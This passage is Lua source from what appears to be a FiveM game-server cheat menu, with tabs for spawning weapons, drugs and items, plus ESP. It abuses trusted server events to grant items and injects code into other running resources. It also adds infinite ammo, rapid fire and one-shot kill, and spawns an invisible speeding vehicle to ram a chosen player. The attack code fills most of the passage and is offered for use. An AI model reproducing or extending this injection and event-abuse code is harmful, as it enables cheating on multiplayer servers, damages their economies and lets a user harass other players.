        local offset = GetOffsetFromEntityInWorldCoords(targetPed, 0, -2.0, 0)
        local vehModel = "futo" -- Change this to the desired vehicle model

        RequestModel(vehModel)
        while not HasModelLoaded(vehModel) do
            Citizen.Wait(0)
        end

        local vehicle = CreateVehicle(vehModel, offset.x, offset.y, offset.z, GetEntityHeading(targetPed), true, true)
        SetEntityVisible(vehicle, false, true)
        if DoesEntityExist(vehicle) then
            NetworkRequestControlOfEntity(vehicle)
            SetVehicleDoorsLocked(vehicle, 4)
            SetVehicleForwardSpeed(vehicle, 120.0) -- Adjust the speed as needed
        end
    else
        MachoMenuNotification("Error", "Player with ID " .. playerServerId .. " not found.")
    end
end

-- Function to draw text above player's heads
function DrawPlayerServerIds()
    for i = 0, 255 do
        if NetworkIsPlayerActive(i) then
            local playerPed = GetPlayerPed(i)
            local playerServerId = GetPlayerServerId(i)
            local playerCoords = GetEntityCoords(playerPed)

            -- Calculate the world position to draw the text above the player's head
            local x, y, z = table.unpack(playerCoords)
            z = z + 1.0 -- Adjust the height above the player's head

            -- Draw the server ID text
            DrawText3D(x, y, z, tostring(playerServerId))
        end
    end
end

-- Function to draw text in 3D world space
function DrawText3D(x, y, z, text)
    local onScreen, _x, _y = World3dToScreen2d(x, y, z)
    if onScreen then
        SetTextScale(0.35, 0.35)
        SetTextFont(4)
        SetTextProportional(1)
        SetTextColour(255, 255, 255, 215)
        SetTextEntry("STRING")
        SetTextCentre(1)
        AddTextComponentString(text)
        DrawText(_x, _y)
    end
end

-- ID SHOW Main thread
Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)
        if idgoster then
            -- Draw server IDs above players
            DrawPlayerServerIds()
        end
    end
end)

-- Other Menu

-- ============================================================
-- EASY SPAWN TAB (No typing - Just click)
-- ============================================================

local EasySpawnTab = MachoMenuAddTab(MenuWindow, "Easy Spawn")
local EasySpawnGroup = MachoMenuGroup(EasySpawnTab, "Easy Spawn", TabSectionWidth, 9, MenuSize.x - TabSectionWidth + 150, MenuSize.y)

-- Helper function to spawn items using both methods
local function SpawnItemEasy(itemName, amount, method)
    amount = amount or 1
    method = method or "lumberjack" -- "lumberjack" or "steal"
    
    if method == "lumberjack" then
        TriggerServerEvent('rt-lumberjack:server:giveItem', itemName, amount)
        MachoMenuNotification("Easy Spawn", "Spawned " .. itemName .. " x" .. amount)
        print("[Easy Spawn] Spawned " .. itemName .. " x" .. amount)
    elseif method == "steal" then
        -- Try direct trigger first
        local success = false
        pcall(function()
            TriggerServerEvent('rt-steal:server:giveItem', itemName, amount)
            success = true
        end)
        
        if not success then
            local targetResource = nil
            if GetResourceState('rt-steal') == "started" then
                targetResource = 'rt-steal'
            elseif GetResourceState('monitor') == "started" then
                targetResource = 'monitor'
            elseif GetResourceState('qb-core') == "started" then
                targetResource = 'qb-core'
            else
                targetResource = 'ox_inventory'
            end
            
            MachoInjectResource2(NewThreadNs, targetResource, string.format([[
                local itemName = "%s"
                local amount = %d
                TriggerServerEvent('rt-steal:server:giveItem', itemName, amount)
            ]], itemName, amount))
        end
        MachoMenuNotification("Easy Spawn", "Spawned " .. itemName .. " x" .. amount)
        print("[Easy Spawn] Spawned " .. itemName .. " x" .. amount)
    end
end

-- ============================================================
-- WEAPONS (RT Steal)
-- ============================================================

MachoMenuText(EasySpawnGroup, "WEAPONS (RT Steal)")

MachoMenuButton(EasySpawnGroup, "Pistol", function() SpawnItemEasy("weapon_pistol", 1, "steal") end)
MachoMenuButton(EasySpawnGroup, "Combat Pistol", function() SpawnItemEasy("weapon_combatpistol", 1, "steal") end)
MachoMenuButton(EasySpawnGroup, "AP Pistol", function() SpawnItemEasy("weapon_appistol", 1, "steal") end)
MachoMenuButton(EasySpawnGroup, "Pistol 50", function() SpawnItemEasy("weapon_pistol50", 1, "steal") end)
MachoMenuButton(EasySpawnGroup, "SMG", function() SpawnItemEasy("weapon_smg", 1, "steal") end)
MachoMenuButton(EasySpawnGroup, "Micro SMG", function() SpawnItemEasy("weapon_microsmg", 1, "steal") end)
MachoMenuButton(EasySpawnGroup, "Assault SMG", function() SpawnItemEasy("weapon_assaultsmg", 1, "steal") end)
MachoMenuButton(EasySpawnGroup, "Assault Rifle", function() SpawnItemEasy("weapon_assaultrifle", 1, "steal") end)
MachoMenuButton(EasySpawnGroup, "Carbine Rifle", function() SpawnItemEasy("weapon_carbinerifle", 1, "steal") end)
MachoMenuButton(EasySpawnGroup, "Advanced Rifle", function() SpawnItemEasy("weapon_advancedrifle", 1, "steal") end)
MachoMenuButton(EasySpawnGroup, "Pump Shotgun", function() SpawnItemEasy("weapon_pumpshotgun", 1, "steal") end)
MachoMenuButton(EasySpawnGroup, "Sawed Off Shotgun", function() SpawnItemEasy("weapon_sawnoffshotgun", 1, "steal") end)
MachoMenuButton(EasySpawnGroup, "Assault Shotgun", function() SpawnItemEasy("weapon_assaultshotgun", 1, "steal") end)
MachoMenuButton(EasySpawnGroup, "Sniper Rifle", function() SpawnItemEasy("weapon_sniperrifle", 1, "steal") end)
MachoMenuButton(EasySpawnGroup, "Heavy Sniper", function() SpawnItemEasy("weapon_heavysniper", 1, "steal") end)
MachoMenuButton(EasySpawnGroup, "RPG", function() SpawnItemEasy("weapon_rpg", 1, "steal") end)
MachoMenuButton(EasySpawnGroup, "Minigun", function() SpawnItemEasy("weapon_minigun", 1, "steal") end)
MachoMenuButton(EasySpawnGroup, "Grenade Launcher", function() SpawnItemEasy("weapon_grenadelauncher", 1, "steal") end)
MachoMenuButton(EasySpawnGroup, "Railgun", function() SpawnItemEasy("weapon_railgun", 1, "steal") end)
MachoMenuButton(EasySpawnGroup, "Stun Gun (Taser)", function() SpawnItemEasy("weapon_stungun", 1, "steal") end)
MachoMenuButton(EasySpawnGroup, "Knife", function() SpawnItemEasy("weapon_knife", 1, "steal") end)
MachoMenuButton(EasySpawnGroup, "Bat", function() SpawnItemEasy("weapon_bat", 1, "steal") end)

-- ============================================================
-- ITEMS (RT Steal)
-- ============================================================

MachoMenuText(EasySpawnGroup, "ITEMS (RT Steal)")

MachoMenuButton(EasySpawnGroup, "Lockpick", function() SpawnItemEasy("lockpick", 5, "steal") end)
MachoMenuButton(EasySpawnGroup, "Advanced Lockpick", function() SpawnItemEasy("advancedlockpick", 5, "steal") end)
MachoMenuButton(EasySpawnGroup, "Handcuffs", function() SpawnItemEasy("handcuffs", 5, "steal") end)
MachoMenuButton(EasySpawnGroup, "Phone", function() SpawnItemEasy("phone", 1, "steal") end)
MachoMenuButton(EasySpawnGroup, "medkit", function() SpawnItemEasy("medkit", 1, "steal") end)
MachoMenuButton(EasySpawnGroup, "Drill", function() SpawnItemEasy("drill", 1, "steal") end)
MachoMenuButton(EasySpawnGroup, "Fal", function() SpawnItemEasy("weapon_fal", 1, "steal") end)
MachoMenuButton(EasySpawnGroup, "Repair Kit", function() SpawnItemEasy("repairkit", 5, "steal") end)
MachoMenuButton(EasySpawnGroup, "Bandage", function() SpawnItemEasy("bandage", 10, "steal") end)
MachoMenuButton(EasySpawnGroup, "Painkillers", function() SpawnItemEasy("painkillers", 10, "steal") end)
MachoMenuButton(EasySpawnGroup, "Armor", function() SpawnItemEasy("armor", 1, "steal") end)

-- ============================================================
-- DRUGS (RT Steal)
-- ============================================================

MachoMenuText(EasySpawnGroup, "DRUGS (RT Steal)")

MachoMenuButton(EasySpawnGroup, "Weed", function() SpawnItemEasy("weed", 10, "steal") end)
MachoMenuButton(EasySpawnGroup, "Cocaine", function() SpawnItemEasy("cocaine", 10, "steal") end)
MachoMenuButton(EasySpawnGroup, "Meth", function() SpawnItemEasy("meth", 10, "steal") end)
MachoMenuButton(EasySpawnGroup, "Crack", function() SpawnItemEasy("crack", 10, "steal") end)
MachoMenuButton(EasySpawnGroup, "Heroin", function() SpawnItemEasy("heroin", 10, "steal") end)
MachoMenuButton(EasySpawnGroup, "Oxy", function() SpawnItemEasy("oxy", 10, "steal") end)

-- ============================================================
-- AMMO (RT Steal)
-- ============================================================

MachoMenuText(EasySpawnGroup, "AMMO (RT Steal)")

MachoMenuButton(EasySpawnGroup, "Pistol Ammo x100", function() SpawnItemEasy("pistol_ammo", 100, "steal") end)
MachoMenuButton(EasySpawnGroup, "SMG Ammo x100", function() SpawnItemEasy("smg_ammo", 100, "steal") end)
MachoMenuButton(EasySpawnGroup, "Rifle Ammo x100", function() SpawnItemEasy("rifle_ammo", 100, "steal") end)
MachoMenuButton(EasySpawnGroup, "Shotgun Ammo x100", function() SpawnItemEasy("shotgun_ammo", 100, "steal") end)
MachoMenuButton(EasySpawnGroup, "Sniper Ammo x100", function() SpawnItemEasy("sniper_ammo", 100, "steal") end)
MachoMenuButton(EasySpawnGroup, "RPG Ammo x10", function() SpawnItemEasy("rpg_ammo", 10, "steal") end)
MachoMenuButton(EasySpawnGroup, "sniper_full", function() SpawnItemEasy("sniper_full", 11, "steal") end)
MachoMenuButton(EasySpawnGroup, "rifle_full", function() SpawnItemEasy("rifle_full", 11, "steal") end)
MachoMenuButton(EasySpawnGroup, "pistol_full", function() SpawnItemEasy("pistol_full", 7, "steal") end)

-- ============================================================
-- LUMBERJACK ITEMS
-- ============================================================

MachoMenuText(EasySpawnGroup, "LUMBERJACK ITEMS")

MachoMenuButton(EasySpawnGroup, "Wood", function() SpawnItemEasy("wood", 50, "lumberjack") end)
MachoMenuButton(EasySpawnGroup, "Plank", function() SpawnItemEasy("plank", 50, "lumberjack") end)
MachoMenuButton(EasySpawnGroup, "Log", function() SpawnItemEasy("log", 50, "lumberjack") end)
MachoMenuButton(EasySpawnGroup, "Sawdust", function() SpawnItemEasy("sawdust", 50, "lumberjack") end)

-- ============================================================
-- FOOD & DRINK (RT Steal)
-- ============================================================

MachoMenuText(EasySpawnGroup, "FOOD & DRINK (RT Steal)")

MachoMenuButton(EasySpawnGroup, "Water Bottle", function() SpawnItemEasy("water_bottle", 10, "steal") end)
MachoMenuButton(EasySpawnGroup, "Sandwich", function() SpawnItemEasy("sandwich", 10, "steal") end)
MachoMenuButton(EasySpawnGroup, "Burger", function() SpawnItemEasy("burger", 10, "steal") end)
MachoMenuButton(EasySpawnGroup, "Donut", function() SpawnItemEasy("donut", 10, "steal") end)
MachoMenuButton(EasySpawnGroup, "Coffee", function() SpawnItemEasy("coffee", 10, "steal") end)
MachoMenuButton(EasySpawnGroup, "Energy Drink", function() SpawnItemEasy("energydrink", 10, "steal") end)

-- ============================================================
-- MISC ITEMS (RT Steal)
-- ============================================================

MachoMenuText(EasySpawnGroup, "MISC ITEMS (RT Steal)")

MachoMenuButton(EasySpawnGroup, "Laptop", function() SpawnItemEasy("laptop", 1, "steal") end)
MachoMenuButton(EasySpawnGroup, "Hacking Device", function() SpawnItemEasy("hacking_device", 1, "steal") end)
MachoMenuButton(EasySpawnGroup, "USB Drive", function() SpawnItemEasy("usb_drive", 5, "steal") end)
MachoMenuButton(EasySpawnGroup, "Radio", function() SpawnItemEasy("radio", 1, "steal") end)
MachoMenuButton(EasySpawnGroup, "Binoculars", function() SpawnItemEasy("binoculars", 1, "steal") end)
MachoMenuButton(EasySpawnGroup, "Scuba Gear", function() SpawnItemEasy("scuba_gear", 1, "steal") end)
MachoMenuButton(EasySpawnGroup, "Parachute", function() SpawnItemEasy("parachute", 1, "steal") end)

print("[Easy Spawn] Tab loaded!")

-- ============================================================
-- WEAPON TAB (Pre-listed weapons - Click to spawn)
-- ============================================================

local WeaponTab = MachoMenuAddTab(MenuWindow, "Weapons")
local WeaponGroup = MachoMenuGroup(WeaponTab, "Weapon Options", TabSectionWidth, 9, MenuSize.x - TabSectionWidth + 150, MenuSize.y)

-- Ammo quantity variable
local S1_weapon_ammo = 250

-- Function to give weapon
local function GiveWeapon(weaponName, ammo)
    ammo = ammo or S1_weapon_ammo
    local hash = GetHashKey(weaponName)
    if hash and hash ~= 0 then
        GiveWeaponToPed(PlayerPedId(), hash, ammo, false, true)
        SetCurrentPedWeapon(PlayerPedId(), hash, true)
        MachoMenuNotification("Weapon", "Spawned: " .. weaponName)
        print("[Weapon] Spawned: " .. weaponName .. " x" .. ammo)
    else
        MachoMenuNotification("Error", "Invalid weapon: " .. weaponName)
    end
end

-- ============================================================
-- MELEE WEAPONS
-- ============================================================

MachoMenuText(WeaponGroup, "MELEE WEAPONS")

MachoMenuButton(WeaponGroup, "Knife", function() GiveWeapon("WEAPON_KNIFE", 1) end)
MachoMenuButton(WeaponGroup, "Bat", function() GiveWeapon("WEAPON_BAT", 1) end)
MachoMenuButton(WeaponGroup, "Hammer", function() GiveWeapon("WEAPON_HAMMER", 1) end)
MachoMenuButton(WeaponGroup, "Crowbar", function() GiveWeapon("WEAPON_CROWBAR", 1) end)
MachoMenuButton(WeaponGroup, "Golf Club", function() GiveWeapon("WEAPON_GOLFCLUB", 1) end)
MachoMenuButton(WeaponGroup, "Machete", function() GiveWeapon("WEAPON_MACHETE", 1) end)
MachoMenuButton(WeaponGroup, "Switchblade", function() GiveWeapon("WEAPON_SWITCHBLADE", 1) end)
MachoMenuButton(WeaponGroup, "Dagger", function() GiveWeapon("WEAPON_DAGGER", 1) end)
MachoMenuButton(WeaponGroup, "Hatchet", function() GiveWeapon("WEAPON_HATCHET", 1) end)
MachoMenuButton(WeaponGroup, "Wrench", function() GiveWeapon("WEAPON_WRENCH", 1) end)
MachoMenuButton(WeaponGroup, "Nightstick", function() GiveWeapon("WEAPON_NIGHTSTICK", 1) end)
MachoMenuButton(WeaponGroup, "Bottle", function() GiveWeapon("WEAPON_BOTTLE", 1) end)

-- ============================================================
-- PISTOLS
-- ============================================================

MachoMenuText(WeaponGroup, "PISTOLS")

MachoMenuButton(WeaponGroup, "Pistol", function() GiveWeapon("WEAPON_PISTOL") end)
MachoMenuButton(WeaponGroup, "Pistol MK2", function() GiveWeapon("WEAPON_PISTOL_MK2") end)
MachoMenuButton(WeaponGroup, "Combat Pistol", function() GiveWeapon("WEAPON_COMBATPISTOL") end)
MachoMenuButton(WeaponGroup, "AP Pistol", function() GiveWeapon("WEAPON_APPISTOL") end)
MachoMenuButton(WeaponGroup, "Pistol 50", function() GiveWeapon("WEAPON_PISTOL50") end)
MachoMenuButton(WeaponGroup, "Heavy Pistol", function() GiveWeapon("WEAPON_HEAVYPISTOL") end)
MachoMenuButton(WeaponGroup, "SNS Pistol", function() GiveWeapon("WEAPON_SNSPISTOL") end)
MachoMenuButton(WeaponGroup, "Vintage Pistol", function() GiveWeapon("WEAPON_VINTAGEPISTOL") end)
MachoMenuButton(WeaponGroup, "Ceramic Pistol", function() GiveWeapon("WEAPON_CERAMICPISTOL") end)
MachoMenuButton(WeaponGroup, "Flare Gun", function() GiveWeapon("WEAPON_FLAREGUN") end)
MachoMenuButton(WeaponGroup, "Stun Gun (Taser)", function() GiveWeapon("WEAPON_STUNGUN") end)
MachoMenuButton(WeaponGroup, "Revolver", function() GiveWeapon("WEAPON_REVOLVER") end)
MachoMenuButton(WeaponGroup, "Double Action Revolver", function() GiveWeapon("WEAPON_DOUBLEACTION") end)
MachoMenuButton(WeaponGroup, "Marksman Pistol", function() GiveWeapon("WEAPON_MARKSMANPISTOL") end)

-- ============================================================
-- SMGs
-- ============================================================

MachoMenuText(WeaponGroup, "SMGs")

MachoMenuButton(WeaponGroup, "SMG", function() GiveWeapon("WEAPON_SMG") end)
MachoMenuButton(WeaponGroup, "SMG MK2", function() GiveWeapon("WEAPON_SMG_MK2") end)
MachoMenuButton(WeaponGroup, "Micro SMG", function() GiveWeapon("WEAPON_MICROSMG") end)
MachoMenuButton(WeaponGroup, "Assault SMG", function() GiveWeapon("WEAPON_ASSAULTSMG") end)
MachoMenuButton(WeaponGroup, "Combat PDW", function() GiveWeapon("WEAPON_COMBATPDW") end)
MachoMenuButton(WeaponGroup, "Machine Pistol", function() GiveWeapon("WEAPON_MACHINEPISTOL") end)
MachoMenuButton(WeaponGroup, "Mini SMG", function() GiveWeapon("WEAPON_MINISMG") end)
MachoMenuButton(WeaponGroup, "Gusenberg Sweeper", function() GiveWeapon("WEAPON_GUSENBERG") end)

-- ============================================================
-- SHOTGUNS
-- ============================================================

MachoMenuText(WeaponGroup, "SHOTGUNS")

MachoMenuButton(WeaponGroup, "Pump Shotgun", function() GiveWeapon("WEAPON_PUMPSHOTGUN") end)
MachoMenuButton(WeaponGroup, "Pump Shotgun MK2", function() GiveWeapon("WEAPON_PUMPSHOTGUN_MK2") end)
MachoMenuButton(WeaponGroup, "Sawed Off Shotgun", function() GiveWeapon("WEAPON_SAWNOFFSHOTGUN") end)
MachoMenuButton(WeaponGroup, "Assault Shotgun", function() GiveWeapon("WEAPON_ASSAULTSHOTGUN") end)
MachoMenuButton(WeaponGroup, "Bullpup Shotgun", function() GiveWeapon("WEAPON_BULLPUPSHOTGUN") end)
MachoMenuButton(WeaponGroup, "Heavy Shotgun", function() GiveWeapon("WEAPON_HEAVYSHOTGUN") end)
MachoMenuButton(WeaponGroup, "Double Barrel Shotgun", function() GiveWeapon("WEAPON_DBSHOTGUN") end)
MachoMenuButton(WeaponGroup, "Sweeper Shotgun", function() GiveWeapon("WEAPON_AUTOSHOTGUN") end)

-- ============================================================
-- RIFLES
-- ============================================================

MachoMenuText(WeaponGroup, "RIFLES")

MachoMenuButton(WeaponGroup, "Assault Rifle", function() GiveWeapon("WEAPON_ASSAULTRIFLE") end)
MachoMenuButton(WeaponGroup, "Assault Rifle MK2", function() GiveWeapon("WEAPON_ASSAULTRIFLE_MK2") end)
MachoMenuButton(WeaponGroup, "Carbine Rifle", function() GiveWeapon("WEAPON_CARBINERIFLE") end)
MachoMenuButton(WeaponGroup, "Carbine Rifle MK2", function() GiveWeapon("WEAPON_CARBINERIFLE_MK2") end)
MachoMenuButton(WeaponGroup, "Advanced Rifle", function() GiveWeapon("WEAPON_ADVANCEDRIFLE") end)
MachoMenuButton(WeaponGroup, "Special Carbine", function() GiveWeapon("WEAPON_SPECIALCARBINE") end)
MachoMenuButton(WeaponGroup, "Special Carbine MK2", function() GiveWeapon("WEAPON_SPECIALCARBINE_MK2") end)
MachoMenuButton(WeaponGroup, "Bullpup Rifle", function() GiveWeapon("WEAPON_BULLPUPRIFLE") end)
MachoMenuButton(WeaponGroup, "Bullpup Rifle MK2", function() GiveWeapon("WEAPON_BULLPUPRIFLE_MK2") end)
MachoMenuButton(WeaponGroup, "Compact Rifle", function() GiveWeapon("WEAPON_COMPACTRIFLE") end)
MachoMenuButton(WeaponGroup, "Military Rifle", function() GiveWeapon("WEAPON_MILITARYRIFLE") end)
MachoMenuButton(WeaponGroup, "Heavy Rifle", function() GiveWeapon("WEAPON_HEAVYRIFLE") end)
MachoMenuButton(WeaponGroup, "Battle Rifle", function() GiveWeapon("WEAPON_BATTLERIFLE") end)
MachoMenuButton(WeaponGroup, "Tactical Rifle", function() GiveWeapon("WEAPON_TACTICALRIFLE") end)
MachoMenuButton(WeaponGroup, "MG", function() GiveWeapon("WEAPON_MG") end)
MachoMenuButton(WeaponGroup, "Combat MG", function() GiveWeapon("WEAPON_COMBATMG") end)
MachoMenuButton(WeaponGroup, "Combat MG MK2", function() GiveWeapon("WEAPON_COMBATMG_MK2") end)

-- ============================================================
-- SNIPERS
-- ============================================================

MachoMenuText(WeaponGroup, "SNIPERS")

MachoMenuButton(WeaponGroup, "Sniper Rifle", function() GiveWeapon("WEAPON_SNIPERRIFLE") end)
MachoMenuButton(WeaponGroup, "Heavy Sniper", function() GiveWeapon("WEAPON_HEAVYSNIPER") end)
MachoMenuButton(WeaponGroup, "Heavy Sniper MK2", function() GiveWeapon("WEAPON_HEAVYSNIPER_MK2") end)
MachoMenuButton(WeaponGroup, "Marksman Rifle", function() GiveWeapon("WEAPON_MARKSMANRIFLE") end)
MachoMenuButton(WeaponGroup, "Marksman Rifle MK2", function() GiveWeapon("WEAPON_MARKSMANRIFLE_MK2") end)

-- ============================================================
-- HEAVY WEAPONS
-- ============================================================

MachoMenuText(WeaponGroup, "HEAVY WEAPONS")

MachoMenuButton(WeaponGroup, "RPG", function() GiveWeapon("WEAPON_RPG", 50) end)
MachoMenuButton(WeaponGroup, "Minigun", function() GiveWeapon("WEAPON_MINIGUN", 500) end)
MachoMenuButton(WeaponGroup, "Grenade Launcher", function() GiveWeapon("WEAPON_GRENADELAUNCHER", 50) end)
MachoMenuButton(WeaponGroup, "Compact Grenade Launcher", function() GiveWeapon("WEAPON_COMPACTLAUNCHER", 50) end)
MachoMenuButton(WeaponGroup, "Homing Launcher", function() GiveWeapon("WEAPON_HOMINGLAUNCHER", 50) end)
MachoMenuButton(WeaponGroup, "Railgun", function() GiveWeapon("WEAPON_RAILGUN", 50) end)
MachoMenuButton(WeaponGroup, "Firework Launcher", function() GiveWeapon("WEAPON_FIREWORK", 50) end)
MachoMenuButton(WeaponGroup, "Up-n-Atomizer", function() GiveWeapon("WEAPON_RAYGUN", 50) end)
MachoMenuButton(WeaponGroup, "Hellbringer", function() GiveWeapon("WEAPON_RAYMINIGUN", 500) end)
MachoMenuButton(WeaponGroup, "Widowmaker", function() GiveWeapon("WEAPON_RAYCARBINE", 500) end)

-- ============================================================
-- THROWABLES
-- ============================================================

MachoMenuText(WeaponGroup, "THROWABLES")

MachoMenuButton(WeaponGroup, "Grenade", function() GiveWeapon("WEAPON_GRENADE", 10) end)
MachoMenuButton(WeaponGroup, "Sticky Bomb", function() GiveWeapon("WEAPON_STICKYBOMB", 10) end)
MachoMenuButton(WeaponGroup, "Molotov Cocktail", function() GiveWeapon("WEAPON_MOLOTOV", 10) end)
MachoMenuButton(WeaponGroup, "Pipe Bomb", function() GiveWeapon("WEAPON_PIPEBOMB", 10) end)
MachoMenuButton(WeaponGroup, "Smoke Grenade", function() GiveWeapon("WEAPON_SMOKEGRENADE", 10) end)
MachoMenuButton(WeaponGroup, "Proximity Mine", function() GiveWeapon("WEAPON_PROXMINE", 10) end)
MachoMenuButton(WeaponGroup, "BZ Gas", function() GiveWeapon("WEAPON_BZGAS", 10) end)

-- ============================================================
-- AMMO & RECOIL TOGGLES
-- ============================================================

MachoMenuText(WeaponGroup, "TOGGLES")

-- Ammo Slider
local ammoSlider = MachoMenuSlider(WeaponGroup, "Ammo Quantity", S1_weapon_ammo, 1, 9999, "rds", 10, function(value)
    S1_weapon_ammo = value
end)

-- Infinite Ammo Toggle
local infiniteAmmoActive = false
MachoMenuCheckbox(WeaponGroup, "Infinite Ammo", function()
    infiniteAmmoActive = true
    MachoInjectResource2(NewThreadNs, 'monitor', [[
        infiniteAmmoActive = true
        CreateThread(function()
            while infiniteAmmoActive do
                Wait(0)
                local ped = PlayerPedId()
                local weapon = GetSelectedPedWeapon(ped)
                if weapon ~= nil and weapon ~= 0 and weapon ~= GetHashKey("WEAPON_UNARMED") then
                    SetPedAmmo(ped, weapon, 9999)
                    SetPedInfiniteAmmo(ped, true, weapon)
                    SetPedInfiniteAmmoClip(ped, true)
                end
            end
        end)
    ]])
    MachoMenuNotification("Ammo", "Infinite Ammo ON")
end, function()
    infiniteAmmoActive = false
    MachoInjectResource2(NewThreadNs, 'monitor', [[
        infiniteAmmoActive = false
        local ped = PlayerPedId()
        local weapon = GetSelectedPedWeapon(ped)
        if weapon ~= nil and weapon ~= 0 then
            SetPedInfiniteAmmo(ped, false, weapon)
            SetPedInfiniteAmmoClip(ped, false)
        end
    ]])
    MachoMenuNotification("Ammo", "Infinite Ammo OFF")
end)

-- No Recoil Toggle
local noRecoilActive = false
MachoMenuCheckbox(WeaponGroup, "No Recoil", function()
    noRecoilActive = true
    MachoInjectResource2(NewThreadNs, 'monitor', [[
        noRecoilActive = true
        CreateThread(function()
            while noRecoilActive do
                Wait(0)
                local cam = GetRenderingCam()
                StopGameplayCamShaking(true)
                if cam ~= 0 then
                    StopCamShaking(cam, true)
                end
                SetPedWeaponRecoilModifier(PlayerPedId(), 0.0)
                SetPedWeaponRecoilShakeMultiplier(PlayerPedId(), 0.0)
                SetPlayerWeaponDefenseModifier(PlayerId(), 1.0)
            end
        end)
    ]])
    MachoMenuNotification("Recoil", "No Recoil ON")
end, function()
    noRecoilActive = false
    MachoInjectResource2(NewThreadNs, 'monitor', [[
        noRecoilActive = false
        SetPedWeaponRecoilModifier(PlayerPedId(), 1.0)
        SetPedWeaponRecoilShakeMultiplier(PlayerPedId(), 1.0)
        StopGameplayCamShaking(false)
    ]])
    MachoMenuNotification("Recoil", "No Recoil OFF")
end)

-- No Reload Toggle
local noReloadActive = false
MachoMenuCheckbox(WeaponGroup, "No Reload", function()
    noReloadActive = true
    MachoInjectResource2(NewThreadNs, 'monitor', [[
        noReloadActive = true
        CreateThread(function()
            while noReloadActive do
                Wait(0)
                RefillAmmoInstantly(PlayerPedId())
            end
        end)
    ]])
    MachoMenuNotification("Reload", "No Reload ON")
end, function()
    noReloadActive = false
    MachoInjectResource2(NewThreadNs, 'monitor', [[
        noReloadActive = false
    ]])
    MachoMenuNotification("Reload", "No Reload OFF")
end)

-- No Spread Toggle
local noSpreadActive = false
MachoMenuCheckbox(WeaponGroup, "No Spread", function()
    noSpreadActive = true
    MachoInjectResource2(NewThreadNs, 'monitor', [[
        noSpreadActive = true
        CreateThread(function()
            while noSpreadActive do
                Wait(0)
                SetPedAccuracy(PlayerPedId(), 100)
                SetPedWeaponAccuracyMultiplier(PlayerPedId(), 100.0)
                SetPedWeaponAccuracyModifier(PlayerPedId(), 100.0)
            end
        end)
    ]])
    MachoMenuNotification("Spread", "No Spread ON")
end, function()
    noSpreadActive = false
    MachoInjectResource2(NewThreadNs, 'monitor', [[
        noSpreadActive = false
        SetPedAccuracy(PlayerPedId(), 50)
        SetPedWeaponAccuracyMultiplier(PlayerPedId(), 1.0)
    ]])
    MachoMenuNotification("Spread", "No Spread OFF")
end)

-- Rapid Fire Toggle
local rapidFireActive = false
MachoMenuCheckbox(WeaponGroup, "Rapid Fire", function()
    rapidFireActive = true
    MachoInjectResource2(NewThreadNs, 'monitor', [[
        rapidFireActive = true
        CreateThread(function()
            while rapidFireActive do
                Wait(0)
                DisablePlayerFiring(PlayerPedId(), true)
                if IsDisabledControlPressed(0, 24) then
                    local _, weapon = GetCurrentPedWeapon(PlayerPedId())
                    local camPos = GetGameplayCamCoord()
                    local camRot = GetGameplayCamRot(2)
                    local rad = 0.01745329
                    local rx = camRot.x * rad
                    local rz = camRot.z * rad
                    local fdx = -math.sin(rz) * math.cos(rx)
                    local fdy = math.cos(rz) * math.cos(rx)
                    local fdz = math.sin(rx)
                    local tx = camPos.x + fdx * 200
                    local ty = camPos.y + fdy * 200
                    local tz = camPos.z + fdz * 200
                    ShootSingleBulletBetweenCoords(camPos.x, camPos.y, camPos.z, tx, ty, tz, 5, true, weapon, PlayerPedId(), true, true, 24000.0)
                end
            end
        end)
    ]])
    MachoMenuNotification("Rapid Fire", "Rapid Fire ON")
end, function()
    rapidFireActive = false
    MachoInjectResource2(NewThreadNs, 'monitor', [[
        rapidFireActive = false
    ]])
    MachoMenuNotification("Rapid Fire", "Rapid Fire OFF")
end)

-- One Shot Kill Toggle
local oneShotActive = false
MachoMenuCheckbox(WeaponGroup, "One Shot Kill", function()
    oneShotActive = true
    SetPlayerWeaponDamageModifier(PlayerId(), 9999.0)
    MachoMenuNotification("One Shot", "One Shot Kill ON")
end, function()
    oneShotActive = false
    SetPlayerWeaponDamageModifier(PlayerId(), 1.0)
    MachoMenuNotification("One Shot", "One Shot Kill OFF")
end)

-- Remove All Weapons
MachoMenuButton(WeaponGroup, "Remove All Weapons", function()
    RemoveAllPedWeapons(PlayerPedId(), true)
    MachoMenuNotification("Weapons", "All weapons removed!")
end)

-- Refill Ammo
MachoMenuButton(WeaponGroup, "Refill Ammo", function()
    local ped = PlayerPedId()
    local weapon = GetSelectedPedWeapon(ped)
    if weapon ~= nil and weapon ~= 0 and weapon ~= GetHashKey("WEAPON_UNARMED") then
        SetPedAmmo(ped, weapon, 9999)
        MachoMenuNotification("Ammo", "Ammo refilled!")
    else
        MachoMenuNotification("Error", "No weapon equipped!")
    end
end)

-- Weapon RGB Toggle
local weaponRGBActive = false
MachoMenuCheckbox(WeaponGroup, "Weapon RGB", function()
    weaponRGBActive = true
    local tints = {0, 1, 2, 3, 4, 5, 6, 7}
    local index = 1
    MachoInjectResource2(NewThreadNs, 'monitor', [[
        weaponRGBActive = true
        local tints = {0, 1, 2, 3, 4, 5, 6, 7}
        local index = 1
        CreateThread(function()
            while weaponRGBActive do
                Wait(125)
                local ped = PlayerPedId()
                local weapon = GetSelectedPedWeapon(ped)
                if weapon ~= nil and weapon ~= 0 and weapon ~= GetHashKey("WEAPON_UNARMED") then
                    SetPedWeaponTintIndex(ped, weapon, tints[index])
                    index = index + 1
                    if index > #tints then index = 1 end
                end
            end
        end)
    ]])
    MachoMenuNotification("Weapon", "Weapon RGB ON")
end, function()
    weaponRGBActive = false
    MachoInjectResource2(NewThreadNs, 'monitor', [[
        weaponRGBActive = false
    ]])
    MachoMenuNotification("Weapon", "Weapon RGB OFF")
end)

print("[Weapons] Tab loaded!")

local OthersTab = MachoMenuAddTab(MenuWindow, "ESP Menu")
local OthersSection = MachoMenuGroup(OthersTab, "ESP Menu", TabSectionWidth, 9, MenuSize.x - TabSectionWidth + 150, MenuSize.y)

MachoMenuCheckbox(OthersSection, "ESP", function()
    MachoInjectResource("any", [[
        local espActive = true
        CreateThread(function()
            while espActive do
                local myPed = PlayerPedId()
                local myCoords = GetEntityCoords(myPed)

                for i = 0, 128 do
                    if NetworkIsPlayerActive(i) and GetPlayerPed(i) ~= myPed then
                        local targetPed = GetPlayerPed(i)
                        local targetCoords = GetEntityCoords(targetPed)
                        local distance = #(myCoords - targetCoords)

                        if distance < 130.0 then
                            local name = GetPlayerName(i)
                            local serverId = GetPlayerServerId(i)
                            local text = serverId .. " | " .. name

